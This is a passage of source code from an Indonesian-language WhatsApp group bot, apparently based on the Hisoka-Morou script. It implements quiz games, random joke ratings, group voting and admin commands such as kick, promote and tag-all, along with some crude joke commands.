            if (this.suit[id]) hisoka.sendText(m.chat, `_Waktu suit habis_`, m)
            delete this.suit[id]
            }, 60000), poin, poin_lose, timeout
            }
            }
            break
            case 'sc': {
                m.reply('Script : https://github.com/DikaArdnt/Hisoka-Morou\n\n Dont Forget Give Star\n\nDonate : 6281615075793 (Link Aja)\nSaweria : https://saweria.co/DikaArdnt\nPaypal : https://www.paypal.me/Cakhaho\n\n Dont Forget Donate')
            }
            break
            case 'chat': {
                if (!isCreator) throw mess.owner
                if (!q) throw 'Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete'
                if (args[0] === 'mute') {
                    hisoka.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    hisoka.chatModify({ mute: null }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    hisoka.chatModify({  archive: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    hisoka.chatModify({ archive: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    hisoka.chatModify({ markRead: true }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    hisoka.chatModify({ markRead: false }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    hisoka.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
	    case 'family100': {
                if ('family100'+m.chat in _family100) {
                    m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
                    throw false
                }
                let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
                _family100['family100'+m.chat] = {
                    id: 'family100'+m.chat,
                    pesan: await hisoka.sendText(m.chat, hasil, m),
                    ...random,
                    terjawab: Array.from(random.jawaban, () => false),
                    hadiah: 6,
                }
            }
            break
case 'apakah':
				if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
					const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
					const kah = apa[Math.floor(Math.random() * apa.length)]
hisoka.sendMessage(m.chat, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted: m })

					break
case 'bisakah':
				if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
					const bisa = ['Bisa','Gak Bisa','Gak Bisa Ajg Aaokawpk','TENTU PASTI KAMU BISA!!!!']
					const ga = bisa[Math.floor(Math.random() * bisa.length)]
hisoka.sendMessage(m.chat, { text: `Pertanyaan : ${q}\nJawaban : ${ga}` }, { quoted: m })

					break
case 'bagaimanakah':
				if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
					const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
					const ya = gimana[Math.floor(Math.random() * gimana.length)]
hisoka.sendMessage(m.chat, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted: m })

					break
case 'rate':
 
				if (!q) return m.reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
					const ra = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
hisoka.sendMessage(m.chat, { text: `Rate : ${q}\nJawaban : *${te}%*` }, { quoted: m })

					break
case 'gantengcek':
  case 'cekganteng':
   
				if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Namalu`)
					const gan = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
hisoka.sendMessage(m.chat, { text: `Nama : ${q}\nJawaban : *${teng}%*` }, { quoted: m })

					break
case 'cantikcek':
  case 'cekcantik':
   
				if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Namalu`)
					const can = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
					const tik = can[Math.floor(Math.random() * can.length)]
hisoka.sendMessage(m.chat, { text: `Nama : ${q}\nJawaban : *${tik}%*` }, { quoted: m })

					break
case 'sangecek':
  case 'ceksange':
    case 'gaycek':
      case 'cekgay':
        case 'lesbicek':
          case 'ceklesbi':
				if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} Namalu`)
					const sangeh = ['5', '10', '15','20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
					const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
hisoka.sendMessage(m.chat, { text: `Nama : ${q}\nJawaban : *${sange}%*` }, { quoted: m })

					break
case 'kapankah':
				if (!q) return m.reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
					const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Abis Command Ini Juga Lu ${q}`]
					const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
hisoka.sendMessage(m.chat, { text: `Pertanyaan : ${q}\nJawaban : *${kapankah}*` }, { quoted: m })
					break
case 'wangy':
              if (!q) return m.reply (`Contoh : .wangy Riy`)
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
             m.reply(awikwok)
              break
case 'cekmati':
              if (!q) return m.reply(`Invalid!\n\nYg mau di cek siapa?`)
              predea = await axios.get(`https://api.agify.io/?name=${q}`)
              m.reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
              break
            case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
            if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            ter = command[1].toLowerCase()
            tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
            m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
            break
            case 'tebak': {
                if (!text) throw `Example : ${prefix + command} lagu\n\nOption : \n1. lagu\n2. gambar\n3. kata\n4. kalimat\n5. lirik\n6. lontong`
                if (args[0] === "lagu") {
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    let msg = await hisoka.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
                    hisoka.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
                    tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'TEBAK LAGU' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, 'NelzBotz', m)
                    delete tebaklagu[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'gambar') {
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
                    tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'TEBAK GAMBAR' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, 'NelzBotz', m)
                    delete tebakgambar[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kata') {
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'TEBAK KATA' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, 'NelzBotz', m)
                    delete tebakkata[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'kalimat') {
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
                    tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'TEBAK KALIMAT' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, 'NelzBotz', m)
                    delete tebakkalimat[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lirik') {
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
                    tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
                    })
                    await sleep(60000)
                    if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'TEBAK LIRIK' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, 'NelzBotz', m)
                    delete tebaklirik[m.sender.split('@')[0]]
                    }
                } else if (args[0] === 'lontong') {
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                    let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
                    let result = anu[Math.floor(Math.random() * anu.length)]
                    hisoka.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
                    caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
		    caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
                    })
                    await sleep(60000)
                    if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    hisoka.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'TEBAK LONTONG' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, 'NelzBotz', m)
                    delete caklontong[m.sender.split('@')[0]]
		    delete caklontong_desk[m.sender.split('@')[0]]
                    }
                }
            }
            break
            case 'kuismath': case 'math': {
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
                let { genMath, modes } = require('./src/math')
                if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
                let result = await genMath(text.toLowerCase())
                hisoka.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
                    kuismath[m.sender.split('@')[0]] = result.jawaban
                })
                await sleep(result.waktu)
                if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
                    console.log("Jawaban: " + result.jawaban)
                    m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
                    delete kuismath[m.sender.split('@')[0]]
                }
            }
            break
            case 'jodohku': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let ments = [me, jodoh]
            let buttons = [
                        { buttonId: 'jodohku', buttonText: { displayText: 'JODOHKU' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, jawab, 'NelzBotz', m, {mentions: ments})
            }
            break
            case 'jadian': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let jawab = `Ciee yang Jadian💖 Jangan lupa pajak jadiannya🐤

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
            let menst = [orang, jodoh]
            let buttons = [
                        { buttonId: 'jadian', buttonText: { displayText: 'JADIAN' }, type: 1 }
                    ]
                    await hisoka.sendButtonText(m.chat, buttons, jawab, 'NelzBotz', m, {mentions: menst})
            }
            break
            case 'react': {
                if (!isCreator) throw mess.owner
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                hisoka.sendMessage(m.chat, reactionMessage)
            }
            break  
            case 'join': {
                if (!isCreator) throw mess.owner
                if (!text) throw 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
                m.reply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await hisoka.groupAcceptInvite(result).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'leave': {
                if (!isCreator) throw mess.owner
                await hisoka.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
            }
            break
            case 'setexif': {
               if (!isCreator) throw mess.owner
               if (!text) throw `Example : ${prefix + command} packname|author`
          global.packname = text.split("|")[0]
          global.author = text.split("|")[1]
          m.reply(`Exif berhasil diubah menjadi\n\n⭔ Packname : ${global.packname}\n⭔ Author : ${global.author}`)
            }
            break
	case 'kick': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'add': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'promote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	case 'demote': {
		if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'block': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
        case 'unblock': {
		if (!isCreator) throw mess.owner
		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
		await hisoka.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
	}
	break
	    case 'setname': case 'setsubject': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await hisoka.groupUpdateSubject(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setdesc': case 'setdesk': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Text ?'
                await hisoka.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
            }
            break
          case 'setppbot': {
                if (!isCreator) throw mess.owner
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                await hisoka.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
           case 'setppgroup': case 'setppgrup': case 'setppgc': {
                if (!m.isGroup) throw mess.group
                if (!isAdmins) throw mess.admin
                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                await hisoka.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
                m.reply(mess.success)
                }
                break
            case 'tagall': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
let teks = `══✪〘 *👥 Tag All* 〙✪══
 
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
                for (let mem of participants) {
                teks += `⭔ @${mem.id.split('@')[0]}\n`
                }
                hisoka.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
                }
                break
                case 'hidetag': {
            if (!m.isGroup) throw mess.group
            if (!isBotAdmins) throw mess.botAdmin
            if (!isAdmins) throw mess.admin
            hisoka.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
            }
            break
	    case 'style': case 'styletext': {
	        if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		db.data.users[m.sender].limit -= 1 // -1 limit
		let { styletext } = require('./lib/scraper')
		if (!text) throw 'Masukkan Query text!'
                let anu = await styletext(text)
                let teks = `Srtle Text From ${text}\n\n`
                for (let i of anu) {
                    teks += `⭔ *${i.name}* : ${i.result}\n\n`
                }
                m.reply(teks)
	    }
	    break
               case 'vote': {
            if (!m.isGroup) throw mess.group
            if (m.chat in vote) throw `_Masih ada vote di chat ini!_\n\n*${prefix}hapusvote* - untuk menghapus vote`
            if (!text) throw `Masukkan Alasan Melakukan Vote, Example: *${prefix + command} Owner Ganteng*`
            m.reply(`Vote dimulai!\n\n*${prefix}upvote* - untuk ya\n*${prefix}devote* - untuk tidak\n*${prefix}cekvote* - untuk mengecek vote\n*${prefix}hapusvote* - untuk menghapus vote`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
let buttonsVote = [
  {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
  {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
]

            let buttonMessageVote = {
                text: teks_vote,
                footer: 'NelzBotz',
                buttons: buttonsVote,
                headerType: 1
            }
            hisoka.sendMessage(m.chat, buttonMessageVote)
	    }
            break
               case 'upvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsUpvote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageUpvote = {
                text: teks_vote,
                footer: 'NelzBotz',
                buttons: buttonsUpvote,
                headerType: 1,
                mentions: menvote
             }
            hisoka.sendMessage(m.chat, buttonMessageUpvote)
	    }
             break
                case 'devote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) throw 'Kamu Sudah Vote'
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote`
            let buttonsDevote = [
              {buttonId: `${prefix}upvote`, buttonText: {displayText: '𝚄𝙿𝚅𝙾𝚃𝙴'}, type: 1},
              {buttonId: `${prefix}devote`, buttonText: {displayText: '𝙳𝙴𝚅𝙾𝚃𝙴'}, type: 1}
            ]

            let buttonMessageDevote = {
                text: teks_vote,
                footer: 'NelzBotz',
                buttons: buttonsDevote,
                headerType: 1,
                mentions: menvote
            }
            hisoka.sendMessage(m.chat, buttonMessageDevote)
	}
            break
                 
case 'cekvote':
if (!m.isGroup) throw mess.group
if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
teks_vote = `*「 VOTE 」*

*Alasan:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DEVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}hapusvote* - untuk menghapus vote


©${hisoka.user.id}
`
hisoka.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
            if (!m.isGroup) throw mess.group
            if (!(m.chat in vote)) throw `_*tidak ada voting digrup ini!*_\n\n*${prefix}vote* - untuk memulai vote`
            delete vote[m.chat]
            m.reply('Berhasil Menghapus Sesi Vote Di Grup Ini')
	    }
            break
               case 'group': case 'grup': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === 'close'){
                    await hisoka.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'open'){
                    await hisoka.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
                } else {
                let buttons = [
